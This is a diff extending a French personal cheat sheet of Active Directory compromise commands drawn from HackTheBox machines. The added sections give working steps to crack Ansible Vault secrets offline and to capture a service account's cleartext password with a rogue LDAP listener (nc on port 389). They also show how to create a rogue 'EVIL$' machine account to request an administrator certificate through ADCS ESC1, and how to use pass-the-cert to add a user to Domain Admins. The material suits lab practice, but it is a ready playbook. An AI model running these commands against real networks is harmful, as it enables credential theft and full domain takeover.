@@ -1,6 +1,6 @@
 # AD — Mémo commandes (récap de toutes mes box)
 
-Aide-mémoire unique, tiré de **Forest, Sauna, Active, Cascade, Blackfield, Resolute, Support**.
+Aide-mémoire unique, tiré de **Forest, Sauna, Active, Cascade, Blackfield, Resolute, Support, Timelapse, Certified, Escape, Authority**.
 Ordre = déroulé d'une compromission AD. `<IP>` = IP cible, `<DOM>` = domaine (ex. `support.htb`), `<DC>` = FQDN du DC.
 
 > ⚠️ **Réflexes qui m'ont fait perdre du temps :**
@@ -71,6 +71,27 @@ echo -n '<hexpass>' | xxd -r -p | openssl enc -des-cbc -d --nopad -K e84ad660c47
 file bin.exe ; strings -e l bin.exe ; monodis bin.exe | grep -iE 'ldstr|key'
 # XOR type Support : base64 -> XOR clé -> XOR 0xDF
 python3 -c 'import base64;e=base64.b64decode("<b64>");k=b"<key>";print(bytes(e[i]^k[i%len(k)]^0xDF for i in range(len(e))).decode())'
+```
+
+### Ansible Vault (secret chiffré versionné) — Authority
+
+Un bloc `!vault | $ANSIBLE_VAULT;1.1;AES256 ...` dans des fichiers Ansible = secret **crackable hors ligne**.
+```bash
+# 1 bloc par fichier : en-tête $ANSIBLE_VAULT + le hex (AUCUNE indentation, pas de > de troncature)
+ansible2john vault.txt > hash.txt          # erreur "expected 3 got 2" = bloc TRONQUÉ (il faut salt\nHMAC\nciphertext)
+hashcat -m 16900 hash.txt rockyou.txt      # -> mot de passe du vault
+ansible-vault view vault.txt               # saisir le pass -> secret en clair
+```
+> Plusieurs vaults d'un même rôle partagent souvent la **même clé** → un seul hash à casser.
+
+### Rogue LDAP (capture d'un bind en clair) — Authority
+
+Une appli (PWM, etc.) configurée pour se **binder** à l'AD peut être détournée vers moi : je pointe son URL LDAP sur ma machine en **clair** et je récupère le mot de passe du compte de service.
+```bash
+# dans la config de l'appli : LDAP URL = ldap://<MON_IP>:389   (389 = CLAIR ; 636 = LDAPS chiffré = inutile)
+sudo nc -lvnp 389        # écouteur AVANT de déclencher le test LDAP dans l'appli
+# le simple-bind envoie DN + mot de passe EN CLAIR dès le 1er paquet :
+#   ...CN=svc_ldap,OU=Service Accounts,...  <PASSWORD_EN_CLAIR>
 ```
 
 ---
@@ -151,18 +172,30 @@ certipy-ad find -vulnerable -u <user> -p '<pass>' -dc-ip <IP> -stdout      # ou 
 
 # ESC1 (le template laisse choisir le SAN) : demander un certif AU NOM de l'admin
 certipy-ad req -u <user> -p '<pass>' -ca <CA_NAME> -template <TPL> -upn administrator@<DOM> -dc-ip <IP>
+#   >>> si "Enrollment Rights = Domain Computers" (Authority) : l'user ne peut pas enrôler
+#       -> créer un COMPTE MACHINE et enrôler avec lui (MachineAccountQuota=10) :
+impacket-addcomputer <DOM>/<user>:'<pass>' -computer-name 'EVIL$' -computer-pass 'Password123!' -dc-ip <IP>
+certipy-ad req -u 'EVIL$' -p 'Password123!' -ca <CA_NAME> -template <TPL> -upn administrator@<DOM> -dc-ip <IP>
 
 # ESC9 (template sans extension SID) : réécrire le UPN de la cible -> certif -> remettre le UPN
 certipy-ad account update -u <ctrl_user> -hashes :<NT> -user <cible> -upn Administrator -dc-ip <IP>
 certipy-ad req -u <cible> -hashes :<NT_cible> -ca <CA_NAME> -template <TPL> -dc-ip <IP>   # -> administrator.pfx
 certipy-ad account update -u <ctrl_user> -hashes :<NT> -user <cible> -upn <cible>@<DOM> -dc-ip <IP>   # remettre !
 
-# 2) authentifier le certif (PKINIT) -> hash NT de l'admin
+# 2) authentifier le certif (PKINIT) -> hash NT de l'admin          [Escape : marche]
 certipy-ad auth -pfx administrator.pfx -dc-ip <IP> -domain <DOM>
 #   -> Got hash for 'administrator@<DOM>': aad3b...:<NThash>
+
+# 2bis) PKINIT KO ("no object SID" / KDC_ERR_PADATA_TYPE_NOSUPP) -> PASS-THE-CERT   [Authority]
+#       le certif sert alors via LDAPS (Schannel) au lieu de Kerberos :
+certipy-ad auth -pfx administrator.pfx -dc-ip <IP> -ldap-shell
+#   dans le shell LDAP (identité = administrator) :
+#     add_user_to_group <user> "Domain Admins"      (puis evil-winrm avec <user>)
+#   cf. outils/ldap-shell.md pour toutes les commandes du shell
 ```
 
 > Modes ESC fréquents : **ESC1** (SAN libre), **ESC8** (relais vers l'enrôlement web), **ESC9** (pas d'extension SID → UPN). `certipy find -vulnerable` te dit lequel.
+> **PKINIT vs Pass-the-Cert** : un certif vaut une authent **Kerberos (→ hash NT)** OU **LDAPS/Schannel (→ ldap-shell)**. Si l'un échoue, tenter l'autre.
 
 ---
 
@@ -288,5 +321,6 @@ dir fichier                                                       # VÉRIFIER la
 | 13100 | Kerberoast (TGS) |
 | 1000 | NTLM |
 | 5600 | NetNTLMv2 (responder) |
+| 16900 | Ansible Vault |
 | 1400 | SHA-256 |
 | 3200 | bcrypt |
